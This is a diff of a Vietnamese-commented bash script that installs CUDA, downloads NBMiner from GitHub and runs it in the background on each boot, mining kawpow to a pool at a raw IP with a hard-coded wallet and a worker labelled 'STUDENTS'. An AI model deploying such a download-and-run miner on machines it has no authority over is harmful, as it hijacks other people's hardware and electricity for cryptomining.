@@ -2,9 +2,8 @@
 
 # Đường dẫn lưu trạng thái
 CUDA_FLAG="/var/tmp/cuda_installed"
-NBMINER_FLAG="/var/tmp/nbminer_installed"
 
-# 1. Kiểm tra nếu CUDA đã được cài đặt
+# 1. Cài đặt CUDA nếu chưa hoàn tất
 if [ ! -f "$CUDA_FLAG" ]; then
     echo "Bắt đầu cài đặt CUDA..."
 
@@ -26,27 +25,19 @@ if [ ! -f "$CUDA_FLAG" ]; then
     sudo reboot
 fi
 
-# 2. Sau khi khởi động lại, kiểm tra và tải NBMiner
-if [ ! -f "$NBMINER_FLAG" ]; then
-    echo "Thiết lập và chạy NBMiner..."
-    
-    # Tải và giải nén NBMiner
-    cd /home/$(whoami)
+# 2. Sau mỗi lần khởi động, chạy NBMiner
+echo "Khởi động lại hệ thống. Thiết lập và chạy NBMiner..."
+
+# Đảm bảo NBMiner tồn tại
+cd /home/$(whoami)
+if [ ! -d "NBMiner_Linux" ]; then
+    echo "NBMiner chưa tồn tại. Tải và giải nén..."
     wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
     tar -xvf NBMiner_42.3_Linux.tgz
-    cd NBMiner_Linux
-    chmod +x nbminer
-
-    # Chạy NBMiner
-    ./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.STUDENTS &
-    
-    # Đánh dấu rằng NBMiner đã được thiết lập
-    touch "$NBMINER_FLAG"
-
-    echo "NBMiner đang chạy."
-    exit 0
+    chmod +x NBMiner_Linux/nbminer
 fi
 
-# 3. Nếu cả CUDA và NBMiner đã được cài đặt
-echo "Hệ thống đã được cấu hình đầy đủ và NBMiner đang hoạt động."
-exit 0
+# Chạy NBMiner
+cd NBMiner_Linux
+./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.STUDETNS &
+echo "NBMiner đã được khởi động."
